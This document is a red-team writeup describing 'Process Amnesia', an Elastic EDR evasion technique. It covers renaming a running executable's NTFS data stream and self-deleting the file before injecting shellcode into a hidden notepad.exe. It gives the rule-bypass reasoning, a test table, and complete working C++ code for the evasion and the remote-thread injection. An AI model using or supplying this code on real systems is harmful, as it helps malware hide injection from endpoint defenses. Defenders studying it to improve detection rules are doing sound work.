# Process Amnesia: Self-Delete Before Inject

When a process deletes or renames its own image file on disk **before** performing remote injection, Elastic EDR no longer fires the "Remote Memory Write to Trusted Target Process" alert. Instead, a "Potential Self Deletion of a Running Executable" alert is triggered.

The sequence is:

1. **NTFS stream rename** (`:$DATA` -> `:xyz`) : the file content becomes 0 bytes on disk
2. **Self-delete** via `FileDispositionInfoEx` with POSIX semantics : the file is removed entirely
3. **Remote injection** via `WriteProcessMemory` + `CreateRemoteThread` into the target

By the time the injection happens, the source process's image file no longer exists on disk.

The self-delete technique is based on [delete-self-poc](https://github.com/LloydLabs/delete-self-poc) by LloydLabs.

## Observation

Alert trade-off on Elastic EDR:

- [x] Potential Self Deletion of a Running Executable
- [ ] Remote Memory Write to Trusted Target Process **(suppressed)**

![](<../../.gitbook/assets/process_amnesia.png>)

## Probable explanation

The [rule's query](https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/windows/defense_evasion_remote_memory_write_to_trusted_target_process.toml) requires:

```
process.executable != null and not process.Ext.api.summary like "*Unknown*"
```

Deleting the source process's image file before injection likely causes `process.executable` to become null or `process.Ext.api.summary` to resolve as `Unknown`. Either condition is enough for the rule to skip the event.

## Test results

Each test combines the NTFS stream rename (baseline) with one additional operation, followed by remote injection.

| # | Operation | API | Self Deletion alert | Remote Memory Write alert |
|---|---|---|:---:|:---:|
| 1 | Stream rename only (`:$DATA` -> `:xyz`) | `SetFileInformationByHandle(FileRenameInfo)` | No | **Yes** |
| 2 | File rename (`MoveFileA`) | `MoveFileA` | **Yes** | No |
| 3 | File rename (`FileRenameInfo`) | `SetFileInformationByHandle(FileRenameInfo)` | **Yes** | No |
| 4 | File rename (`FileRenameInfoEx` + POSIX) | `SetFileInformationByHandle(FileRenameInfoEx)` | **Yes** | No |
| 5 | File delete (`FileDispositionInfoEx` + POSIX) | `SetFileInformationByHandle(FileDispositionInfoEx)` | **Yes** | No |

{% hint style="info" %}
The stream rename alone (test 1) does not suppress the injection alert because the file path remains intact in the MFT. An additional file rename or delete operation is required to break the EDR correlation.
{% endhint %}

## Code

```cpp
#include <windows.h>
#include "shellcode.h"

int main(void) {
    wchar_t wcPath[MAX_PATH];
    GetModuleFileNameW(NULL, wcPath, MAX_PATH);

    // Step 1: NTFS stream rename (:$DATA -> :xyz) -> file becomes 0 bytes on disk
    HANDLE hFile = CreateFileW(wcPath, DELETE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return 1;

    const wchar_t newStream[] = L":xyz";
    BYTE buf[sizeof(FILE_RENAME_INFO) + sizeof(newStream)] = {0};
    FILE_RENAME_INFO* fri = (FILE_RENAME_INFO*)buf;
    fri->FileNameLength = sizeof(newStream) - sizeof(WCHAR);
    memcpy(fri->FileName, newStream, sizeof(newStream));
    SetFileInformationByHandle(hFile, FileRenameInfo, fri, sizeof(buf));
    CloseHandle(hFile);

    // Step 2: Self-delete
    hFile = CreateFileW(wcPath, DELETE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return 1;

    FILE_DISPOSITION_INFO_EX fDeleteEx = {0};
    fDeleteEx.Flags = FILE_DISPOSITION_FLAG_DELETE | FILE_DISPOSITION_FLAG_POSIX_SEMANTICS;
    SetFileInformationByHandle(hFile, FileDispositionInfoEx, &fDeleteEx, sizeof(fDeleteEx));
    CloseHandle(hFile);

    // Step 3: Remote thread injection
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = {0};
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    CreateProcessA("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE, DETACHED_PROCESS | CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    Sleep(500);

    LPVOID mem = VirtualAllocEx(pi.hProcess, NULL, shellcode_bin_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    WriteProcessMemory(pi.hProcess, mem, shellcode_bin, shellcode_bin_len, NULL);

    DWORD old;
    VirtualProtectEx(pi.hProcess, mem, shellcode_bin_len, PAGE_EXECUTE_READ, &old);
    CreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return 0;
}
```

## References

{% embed url="https://github.com/jsdlm/ProcessAmnesia" %}

{% embed url="https://github.com/LloydLabs/delete-self-poc" %}

{% embed url="https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/windows/defense_evasion_remote_memory_write_to_trusted_target_process.toml" %}

